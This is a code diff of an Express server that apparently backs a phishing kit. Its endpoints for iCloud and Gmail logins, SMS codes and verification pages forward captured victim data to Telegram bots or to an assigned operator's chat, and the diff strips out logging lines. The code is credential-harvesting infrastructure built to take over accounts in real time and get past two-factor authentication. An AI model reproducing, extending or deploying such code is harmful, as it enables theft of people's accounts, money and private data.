@@ -190,7 +190,6 @@ function startSelfPing() {
   setInterval(async () => {
     try {
       await fetch(`${APP_URL}/`, { method: 'GET' });
-      console.log(`🔄 Pinged`);
     } catch (err) {
       console.error(`❌ Ping error`);
     }
@@ -400,7 +399,6 @@ app.post("/send-redirection", async (req, res) => {
     // ============================================================================
 
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Redirection going to winner only: ${userWinnerTelegram[email]}`);
       
       await sendFollowUpMessage(email, message, options);
 
@@ -415,7 +413,6 @@ app.post("/send-redirection", async (req, res) => {
       console.log(`💾 Stored page 2 message data for ${email} (waiting for loser click)`);
 
     } else {
-      console.log(`📨 Redirection fallback: sending to both (no winner for ${email})`);
       
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       await fetch(url, {
@@ -681,7 +678,6 @@ app.post("/verify-sms", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML",
         reply_markup: {
@@ -760,7 +756,6 @@ app.post("/check-sms-status", (req, res) => {
     // Check pendingApprovals as fallback
     if (pendingApprovals[email]) {
       const approvalStatus = pendingApprovals[email].status;
-      console.log(`✅ Approval status for ${email}: ${approvalStatus}`);
       
       if (approvalStatus === "sms_accept") {
         return res.json({ status: "sms_accepted" });
@@ -808,14 +803,11 @@ app.post("/resend-sms", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY - NO BUTTONS
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Resend SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
         // ✅ NO reply_markup - no buttons!
       });
-      console.log(`✅ Resend SMS sent successfully to ${userWinnerTelegram[email]}`);
     } else {
-      console.log(`⚠️ No winner found for ${email}, cannot resend SMS`);
       return res.status(400).json({ error: "No winner determined for this email" });
     }
 
@@ -884,7 +876,6 @@ app.post("/page-login", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 iCloud Page Login going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -992,7 +983,6 @@ app.post("/sms-code", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 iCloud SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -1079,7 +1069,6 @@ app.post("/resend-icloud-sms", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Resend iCloud SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
       });
@@ -1168,7 +1157,6 @@ app.post("/send-gmail-login", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY (use tracking email for winner lookup)
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Gmail going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -1376,7 +1364,6 @@ app.post("/send-verification-page", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
     if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -1526,7 +1513,6 @@ app.post("/send-verification-confirm", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
     if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      console.log(`📨 Verification confirm going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
@@ -1605,7 +1591,6 @@ app.post("/resend-verification", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      console.log(`📨 Resend verification going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
@@ -1699,7 +1684,6 @@ app.post("/resend-verification-confirm", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
-      console.log(`📨 Resend verification confirm going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
